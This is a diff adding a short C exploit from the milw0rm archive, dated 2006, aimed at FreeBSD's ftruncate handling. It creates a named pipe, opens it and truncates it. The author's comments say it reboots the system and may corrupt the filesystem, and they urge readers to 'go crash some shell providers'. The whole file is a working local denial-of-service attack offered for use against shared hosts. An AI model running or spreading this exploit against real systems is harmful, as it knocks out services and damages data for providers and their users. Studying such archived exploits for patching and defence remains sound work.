@@ -1,0 +1,27 @@
+/* FreeBSD cvs commit: src/sys/ufs/ufs/ufs_vnops.c maxim 2006-05-31 13:15:29 UTC
+   Log: According to POSIX, the result of ftruncate(2) is unspecified
+   for file types other than VREG, VDIR and shared memory objects.
+   We already handle VREG, VLNK and VDIR cases.  Silently ignore
+   truncate requests for all the rest. PR kern/98064
+
+   lol lol, thatz true. kokanin@gmail lolling it out in '06 !"#%&%(20061013)(="#"!
+   tested on FreeBSD 6.0-RELEASE-p5, 6.1-RELEASE-p10 (latest at the time of writing)
+   - it just makes the system reboot, and with a bit of luck fucks up the filesystem.
+   wow, that sort of makes this 0day local freebsd denial of service for non-CURRENT or whatever.
+   usage: ./run me and wait a moment.. woo, it's friday the 13th, go crash some shell providers.
+   
+*/
+
+#include <fcntl.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+
+int main(){
+mkfifo("lol",0x1b6);
+int fd = open("lol",O_RDWR); 
+ftruncate(fd,12345);
+close(fd);
+}
+
+// milw0rm.com [2006-10-13]
